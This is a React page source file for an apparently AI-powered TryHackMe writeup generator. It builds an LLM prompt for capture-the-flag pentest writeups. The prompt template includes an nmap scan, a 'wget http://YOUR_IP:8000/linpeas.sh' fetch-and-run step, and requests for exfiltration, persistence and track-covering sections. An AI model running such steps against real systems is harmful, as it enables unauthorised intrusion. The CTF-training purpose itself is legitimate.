import { useState } from 'react';
import { DevvAI } from '@devvai/devv-code-backend';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Label } from '@/components/ui/label';
import { Textarea } from '@/components/ui/textarea';
import { Card, CardContent, CardHeader, CardTitle, CardDescription } from '@/components/ui/card';
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from '@/components/ui/select';
import { useToast } from '@/hooks/use-toast';
import { Download, Loader2, FileText, Terminal } from 'lucide-react';
import ReactMarkdown from 'react-markdown';
import { Prism as SyntaxHighlighter } from 'react-syntax-highlighter';
import { vscDarkPlus } from 'react-syntax-highlighter/dist/esm/styles/prism';

export default function WriteupGeneratorPage() {
  const [roomName, setRoomName] = useState('');
  const [targetIP, setTargetIP] = useState('');
  const [difficulty, setDifficulty] = useState<'easy' | 'medium' | 'hard'>('medium');
  const [hints, setHints] = useState('');
  const [generatedWriteup, setGeneratedWriteup] = useState('');
  const [isGenerating, setIsGenerating] = useState(false);
  const [streamingContent, setStreamingContent] = useState('');
  const { toast } = useToast();

  const generateWriteup = async () => {
    if (!roomName || !targetIP) {
      toast({
        title: 'Missing Information',
        description: 'Please provide room name and target IP',
        variant: 'destructive',
      });
      return;
    }

    setIsGenerating(true);
    setStreamingContent('');
    setGeneratedWriteup('');

    try {
      const ai = new DevvAI();
      
      const prompt = `Generate a comprehensive TryHackMe-style penetration testing writeup with the following details:

Room Name: ${roomName}
Target IP: ${targetIP}
Difficulty: ${difficulty}
${hints ? `Hints: ${hints}` : ''}

Create a detailed Markdown writeup following this EXACT structure:

# ${roomName} - TryHackMe Writeup

## Overview
- **Difficulty**: ${difficulty}
- **Target IP**: ${targetIP}
- **Author**: SeshForge AI
- Brief description of the machine and key skills required

## Reconnaissance

### Initial Setup
\`\`\`bash
sudo echo "${targetIP} ${roomName.toLowerCase().replace(/\s+/g, '')}.thm" >> /etc/hosts
\`\`\`
Explanation: Adding the target to /etc/hosts for easier access using domain names.

### Port Scanning
\`\`\`bash
nmap -sC -sV -p- -T4 ${targetIP}
\`\`\`

Expected output example and explanation of each flag:
- -sC: Run default scripts
- -sV: Version detection
- -p-: Scan all 65535 ports
- -T4: Aggressive timing

## Enumeration

Based on open ports discovered, provide detailed enumeration steps for common services:
- HTTP/HTTPS enumeration with gobuster
- SMB enumeration if applicable
- SSH enumeration if applicable

Include actual commands and explain the reasoning.

## Exploitation

Provide step-by-step exploitation methodology:
1. Vulnerability identification
2. Exploit selection and preparation
3. Gaining initial access
4. Command examples with explanations

## Privilege Escalation

Include multiple privilege escalation techniques:
\`\`\`bash
# Upload linpeas
wget http://YOUR_IP:8000/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
\`\`\`

Explain common vectors:
- SUID binaries
- Sudo misconfigurations
- Cron jobs
- Kernel exploits

## Post Exploitation

- Data exfiltration techniques
- Persistence methods
- Covering tracks

## Flags

### User Flag
\`\`\`
THM{example_user_flag_here}
\`\`\`
Location: /home/user/user.txt

### Root Flag
\`\`\`
THM{example_root_flag_here}
\`\`\`
Location: /root/root.txt

## Key Takeaways

- List 3-5 important lessons learned
- Common pitfalls to avoid
- Tools and techniques mastered

## Recommended Next Steps

Suggest similar machines or skills to practice next.

---

**Important**: Focus on METHODOLOGY and REASONING, not just commands. Explain WHY each step is taken. Use realistic scenarios and common pentesting workflows. All bash commands must be in proper code blocks.`;

      const stream = await ai.chat.completions.create({
        model: 'kimi-k2-0711-preview',
        messages: [
          {
            role: 'system',
            content: 'You are a professional penetration tester creating detailed writeups for educational purposes. Write clear, methodical explanations that teach proper pentesting methodology. Use realistic command outputs and explain every step.'
          },
          { role: 'user', content: prompt }
        ],
        stream: true,
        max_tokens: 4000,
        temperature: 0.7,
      });

      let fullContent = '';
      for await (const chunk of stream) {
        const content = chunk.choices[0]?.delta?.content || '';
        if (content) {
          fullContent += content;
          setStreamingContent(fullContent);
        }
      }

      setGeneratedWriteup(fullContent);
      setStreamingContent('');
      
      toast({
        title: 'Writeup Generated',
        description: 'Your pentesting writeup is ready',
      });
    } catch (error) {
      console.error('Generation error:', error);
      toast({
        title: 'Generation Failed',
        description: 'Failed to generate writeup. Please try again.',
        variant: 'destructive',
      });
    } finally {
      setIsGenerating(false);
    }
  };

  const downloadMarkdown = () => {
    const blob = new Blob([generatedWriteup], { type: 'text/markdown' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = `${roomName.toLowerCase().replace(/\s+/g, '-')}-writeup.md`;
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    URL.revokeObjectURL(url);
    
    toast({
      title: 'Downloaded',
      description: 'Writeup saved as Markdown file',
    });
  };

  return (
    <div className="container max-w-7xl mx-auto p-6 space-y-6">
      <div className="flex items-center gap-3 mb-6">
        <FileText className="w-8 h-8 text-primary" />
        <div>
          <h1 className="text-3xl font-bold text-gradient-primary">TryHackMe Writeup Generator</h1>
          <p className="text-muted-foreground font-mono text-sm">
            AI-powered pentesting writeups for learning and documentation
          </p>
        </div>
      </div>

      <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
        {/* Input Form */}
        <Card className="terminal-window">
          <div className="terminal-header">
            <div className="terminal-dot bg-destructive"></div>
            <div className="terminal-dot bg-chart-3"></div>
            <div className="terminal-dot bg-secondary"></div>
            <span className="ml-2 text-xs text-muted-foreground font-mono">writeup-generator.sh</span>
          </div>
          
          <CardHeader>
            <CardTitle className="flex items-center gap-2">
              <Terminal className="w-5 h-5" />
              Machine Details
            </CardTitle>
            <CardDescription>Configure target machine parameters</CardDescription>
          </CardHeader>

          <CardContent className="space-y-4">
            <div className="space-y-2">
              <Label htmlFor="roomName" className="font-mono">Room Name</Label>
              <Input
                id="roomName"
                placeholder="e.g., Blue, Mr Robot, Bounty Hacker"
                value={roomName}
                onChange={(e) => setRoomName(e.target.value)}
                className="font-mono"
                disabled={isGenerating}
              />
            </div>

            <div className="space-y-2">
              <Label htmlFor="targetIP" className="font-mono">Target IP</Label>
              <Input
                id="targetIP"
                placeholder="10.10.10.10"
                value={targetIP}
                onChange={(e) => setTargetIP(e.target.value)}
                className="font-mono"
                disabled={isGenerating}
              />
            </div>

            <div className="space-y-2">
              <Label htmlFor="difficulty" className="font-mono">Difficulty</Label>
              <Select
                value={difficulty}
                onValueChange={(value: 'easy' | 'medium' | 'hard') => setDifficulty(value)}
                disabled={isGenerating}
              >
                <SelectTrigger id="difficulty" className="font-mono">
                  <SelectValue />
                </SelectTrigger>
                <SelectContent>
                  <SelectItem value="easy">Easy</SelectItem>
                  <SelectItem value="medium">Medium</SelectItem>
                  <SelectItem value="hard">Hard</SelectItem>
                </SelectContent>
              </Select>
            </div>

            <div className="space-y-2">
              <Label htmlFor="hints" className="font-mono">Optional Hints</Label>
              <Textarea
                id="hints"
                placeholder="e.g., Windows machine, CVE-2021-34527, SMB enumeration"
                value={hints}
                onChange={(e) => setHints(e.target.value)}
                className="font-mono min-h-[100px]"
                disabled={isGenerating}
              />
              <p className="text-xs text-muted-foreground">
                Provide context to guide the AI (OS type, vulnerabilities, key services)
              </p>
            </div>

            <Button
              onClick={generateWriteup}
              disabled={isGenerating}
              className="w-full neon-glow"
              size="lg"
            >
              {isGenerating ? (
                <>
                  <Loader2 className="w-4 h-4 mr-2 animate-spin" />
                  Generating Writeup...
                </>
              ) : (
                <>
                  <Terminal className="w-4 h-4 mr-2" />
                  Generate Writeup
                </>
              )}
            </Button>
          </CardContent>
        </Card>

        {/* Output Preview */}
        <Card className="terminal-window">
          <div className="terminal-header">
            <div className="terminal-dot bg-destructive"></div>
            <div className="terminal-dot bg-chart-3"></div>
            <div className="terminal-dot bg-secondary"></div>
            <span className="ml-2 text-xs text-muted-foreground font-mono">writeup-preview.md</span>
          </div>
          
          <CardHeader>
            <div className="flex items-center justify-between">
              <CardTitle>Generated Writeup</CardTitle>
              {generatedWriteup && (
                <Button
                  onClick={downloadMarkdown}
                  variant="outline"
                  size="sm"
                  className="gap-2"
                >
                  <Download className="w-4 h-4" />
                  Export .md
                </Button>
              )}
            </div>
          </CardHeader>

          <CardContent>
            <div className="prose prose-invert prose-sm max-w-none overflow-y-auto max-h-[600px] pr-2 custom-scrollbar">
              {isGenerating && streamingContent && (
                <div>
                  <ReactMarkdown
                    components={{
                      code({ className, children, ...props }: any) {
                        const match = /language-(\w+)/.exec(className || '');
                        const inline = !match;
                        return !inline && match ? (
                          <SyntaxHighlighter
                            style={vscDarkPlus as any}
                            language={match[1]}
                            PreTag="div"
                          >
                            {String(children).replace(/\n$/, '')}
                          </SyntaxHighlighter>
                        ) : (
                          <code className={className} {...props}>
                            {children}
                          </code>
                        );
                      },
                    }}
                  >
                    {streamingContent}
                  </ReactMarkdown>
                  <span className="inline-block w-2 h-4 bg-primary animate-pulse ml-1">▋</span>
                </div>
              )}
              
              {!isGenerating && generatedWriteup && (
                <ReactMarkdown
                  components={{
                    code({ className, children, ...props }: any) {
                      const match = /language-(\w+)/.exec(className || '');
                      const inline = !match;
                      return !inline && match ? (
                        <SyntaxHighlighter
                          style={vscDarkPlus as any}
                          language={match[1]}
                          PreTag="div"
                        >
                          {String(children).replace(/\n$/, '')}
                        </SyntaxHighlighter>
                      ) : (
                        <code className={className} {...props}>
                          {children}
                        </code>
                      );
                    },
                  }}
                >
                  {generatedWriteup}
                </ReactMarkdown>
              )}

              {!isGenerating && !generatedWriteup && (
                <div className="flex flex-col items-center justify-center h-full min-h-[400px] text-center space-y-4">
                  <FileText className="w-16 h-16 text-muted-foreground/50" />
                  <div>
                    <p className="text-muted-foreground font-mono">
                      No writeup generated yet
                    </p>
                    <p className="text-xs text-muted-foreground mt-2">
                      Fill in the machine details and click Generate Writeup
                    </p>
                  </div>
                </div>
              )}
            </div>
          </CardContent>
        </Card>
      </div>
    </div>
  );
}
